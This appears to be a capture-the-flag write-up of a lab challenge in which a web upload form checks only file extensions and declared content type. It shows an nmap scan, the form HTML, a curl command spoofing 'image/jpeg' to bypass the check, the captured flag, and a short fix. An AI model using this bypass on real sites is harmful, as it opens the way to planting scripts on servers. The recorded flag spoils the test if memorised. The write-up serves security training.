# <span style="text-decoration: underline"> File Upload </span>

- Tags : `file` , `image` , `upload`
- Server ip : `192.168.1.23 `
- Difficulty : <span style="color : orange">Medium</span>

___

## <span style="text-decoration: underline">problem</span>

During our `nmap` scans from other challenges we found out that there exists different pages

```bash
$ sudo nmap -q --script=http-csrf   192.168.1.23

Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-25 21:17 CEST
Nmap scan report for 192.168.1.23
Host is up (0.00018s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.23
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.23:80/?page=signin
|     Form id: 
|     Form action: #
|     
|     Path: http://192.168.1.23:80/?page=upload
|     Form id: 
|     Form action: #
|     
|     Path: http://192.168.1.23:80/?page=member
|     Form id: 
|     Form action: #
|     
|     Path: http://192.168.1.23:80/?page=searchimg
|     Form id: 
|_    Form action: #
4242/tcp open  vrml-multi-use
MAC Address: 08:00:27:CD:44:94 (Oracle VirtualBox virtual NIC)
```

> For this write we will be intereseted on `http://192.168.1.23:80/?page=upload`

?> We can also access this page using the `ADD IMAGE` button from the **home page**

When we visit the **upload** page (http://192.168.1.23:80/?page=upload) we see the following

> ![upload page](/.resources/images/upload_index.png)

We can see there is a `brows` button and there is a `UPLOAD` button. On top of all the button it says **Choose an image to upload**. From this we can guess that we have to upload an **image** file.

When we try to upload a `png` image file it shows the following message **`Your image was not uploaded.`**. It didn't work for us. When we change the extention from `png` to `jpeg` and try to upload again it shos the following message **`/tmp/img.jpeg succesfully uploaded.`**. It seems like the server do not verify the content of the file when we upload them but it verifies the extention. To prouve our theory we create an empty file and give it the name `any.jpeg` and try to upload it. It gives us the following message **`/tmp/any.jpeg succesfully uploaded.`**.

?> This is is typically the situation for website that shows the raw image that you upload them. In many occasion in the old days we could find website that let you upload images and you could see those images using the url of the image in `raw` format. By `raw` i mean it is not treated or modified nor it is shown using a program. it is shows directly from the uploaded directory. In this kind of situation hackers used to upload `php` scripts (because most of those sites ware made using `php` programs) and as the name of the file was not modified, to execute the uploaded `php` scripts only by eccessing the url.

!> In our case it seems like the extention of the file has to be `jpeg` or `jpg` to upload it through the means they have given us.

When we inspect the `form` for upload we find the following `html` code

```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```

Where we see that the form uses the following fields do the `POST` request

|Key|Value|
|---|-----|
|MAX_FILE_SIZE|100000|
|uploaded| [Our "image" file that we want to upload]|
|Upload|Upload|

!> Sadly we can not modify the `input` type to `image` so that we can **try** to fool the server to think the uploaded element is an image

## <span style="text-decoration: underline">Solution</span>

Using curl we can easily upload a file with a the `type` name we want. Here is our command to do that

```bash
url -s -F "uploaded=@img.png;type=image/jpeg" -F Upload=Upload "http://192.168.1.23/?page=upload" | grep flag
```
|Option|Description|
|--|--|
|`-s` | Silent|
|`-F`|( — form) option, which will add `enctype=”multipart/form-data”` to the request.|

this gives us the following result

```bash
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/img.png succesfully uploaded.</pre>
```

?> We use the `;type=image/jpeg` to tell the server that this has a file type of an `image` 
?> After some playing arround we can see that the `MAX_FILE_SIZE` parameter is not needed.

# <span style="text-decoration: underline">How to avoid the problem</span>
This kind of problem could be evoided by not only checking the file `extention` but also by checking the type of file by looking inside the file's content.


# <span style="text-decoration: underline">Flag

```text
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

# <span style="text-decoration: underline">Resources</span>

- [Upload files with CURL](https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76)
- [File type using CURL](https://stackoverflow.com/a/4074949/4440716)
- [Send a file via POST with cURL and PHP](https://blog.derakkilgo.com/2009/06/07/send-a-file-via-post-with-curl-and-php/)
